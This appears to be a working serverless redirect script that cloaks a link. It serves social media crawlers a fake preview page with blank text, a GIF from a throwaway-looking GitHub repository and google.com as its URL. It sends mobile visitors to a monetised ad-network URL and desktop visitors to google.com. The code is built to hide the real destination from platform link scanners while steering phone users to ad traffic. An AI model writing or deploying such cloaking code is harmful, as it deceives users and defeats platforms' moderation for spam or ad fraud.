
export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://raw.githubusercontent.com/wepi96383-tech/dvfgbcff/29d45da75cc44bc03f507f4b582aba4d79efdd18/915716cb-0c49-4199-8a93-fe1c5a57c20b.gif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://www.profitableratecpmnetwork.com/d21tvqv6?key=85056938cd44907cb51cc77022d82882", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
